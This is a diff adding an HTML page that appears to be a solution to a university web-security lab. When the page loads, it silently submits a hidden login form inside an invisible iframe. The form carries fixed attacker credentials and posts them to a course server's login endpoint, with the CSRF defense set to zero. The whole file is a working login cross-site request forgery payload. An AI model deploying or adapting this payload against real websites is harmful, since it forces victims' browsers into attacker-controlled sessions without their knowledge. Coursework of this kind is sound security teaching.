@@ -1,0 +1,14 @@
+<style type="text/css">
+iframe {display:none;}
+</style>
+<script src="http://ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
+<script> 
+	window.onload = function(){
+		document.forms['hacks'].submit();
+	}
+</script> 
+<form method="POST" action="http://trurl.cs.illinois.edu/login?csrfdefense=0&xssdefense=5" id="hacks" target="hidden_iframe">
+  <input type="hidden" name="username" value="attacker">
+  <input type="hidden" name="password" value="l33th4x">
+</form>
+<iframe src="" name="hidden_iframe" id="hidden_iframe"></iframe>
